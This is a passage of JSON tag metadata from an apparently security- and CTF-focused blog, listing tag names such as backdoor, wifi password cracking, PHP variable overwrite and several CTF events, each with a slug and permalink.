y","slug":"Security","permalink":"http://example.com/tags/Security/"},{"name":"后门","slug":"后门","permalink":"http://example.com/tags/%E5%90%8E%E9%97%A8/"},{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"IoT","slug":"IoT","permalink":"http://example.com/tags/IoT/"},{"name":"wifi密码破解","slug":"wifi密码破解","permalink":"http://example.com/tags/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"name":"CUMT双月赛三","slug":"CUMT双月赛三","permalink":"http://example.com/tags/CUMT%E5%8F%8C%E6%9C%88%E8%B5%9B%E4%B8%89/"},{"name":"攻防世界MISC","slug":"攻防世界MISC","permalink":"http://example.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC/"},{"name":"攻防世界xctf-web","slug":"攻防世界xctf-web","permalink":"http://example.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cxctf-web/"},{"name":"南邮Crypto","slug":"南邮Crypto","permalink":"http://example.com/tags/%E5%8D%97%E9%82%AECrypto/"},{"name":"实验吧web","slug":"实验吧web","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C%E5%90%A7web/"},{"name":"php变量覆盖","slug":"php变量覆盖","permalink":"http://example.com/tags/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"cumt","slug":"cumt","permalink":"http://example.com/tags/cumt/"},{"name":"南邮web","slug":"南邮web","permalink":"http://example.com/tags/%E5%8D%97%E9%82%AEweb/"},{"name":"代码审计","slug":"代码审计","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"},{"name":"upload_labs","slug":"upload-labs","permalink":"http://example.com/tags/upload-labs/"},{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"},{"name":"cumt双月赛一","slug":"cumt双月赛一","permalink":"http://example.com/tags/cumt%E5%8F%8C%E6%9C%88%E8%B5%9B%E4%B8%80/"},{"name":"安恒11月月赛","slug":"安恒11月月赛","permalink":"http://example.com/tags/%E5%AE%89%E6%81%9211%E6%9C%88%E6%9C%88%E8%B5%9B/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"MISC","slug":"MISC","permalink":"http://example.com/tags/MISC/"}]}